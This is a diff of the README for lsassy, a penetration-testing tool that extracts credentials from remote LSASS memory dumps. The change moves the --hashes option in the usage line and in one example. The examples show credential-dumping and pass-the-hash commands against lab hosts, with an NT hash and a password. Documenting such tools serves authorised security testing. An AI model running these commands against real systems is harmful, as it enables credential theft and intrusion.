@@ -16,7 +16,7 @@ This library uses [impacket](https://github.com/SecureAuthCorp/impacket) project
 ## Basic Usage
 
 ```
-lsassy [<domain>/]<user>[:<password>]@<target>:/share_name/path/to/lsass.dmp [--hashes [LM:]NT]
+lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>:/share_name/path/to/lsass.dmp
 ```
 
 ## CrackMapExec module
@@ -32,7 +32,7 @@ CrackMapExec module is in `cme` folder : [CME Module](/cme/)
 ```
 lsassy ADSEC.LOCAL/jsnow:Winter_is_coming_\!@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
 
-lsassy Administrateur:952c28bd2fd728898411b301475009b7@desktop01.adsec.local:/ADMIN$/lsass.dmp
+lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrateur@desktop01.adsec.local:/ADMIN$/lsass.dmp
 ```
 
 ### CME Module
